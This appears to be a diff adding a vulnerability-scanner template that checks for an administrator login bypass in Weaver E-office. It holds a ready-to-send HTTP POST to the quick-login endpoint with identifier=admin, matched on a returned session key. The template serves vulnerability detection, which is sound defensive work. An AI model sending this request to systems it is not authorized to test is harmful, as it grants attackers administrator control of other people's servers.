@@ -1,0 +1,28 @@
+id: weaver-eoffice-admin-login-bypass
+info:
+  name: Weaver E-office Admin Account Login Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver E-office has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations.
+  tags: [permission-bypass, eoffice]
+  reference:
+    - https://fofa.so/
+http:
+  - raw:
+      - |
+        POST /E-mobile/App/System/Login/login_quick.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        identifier=admin
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "sessionkey"
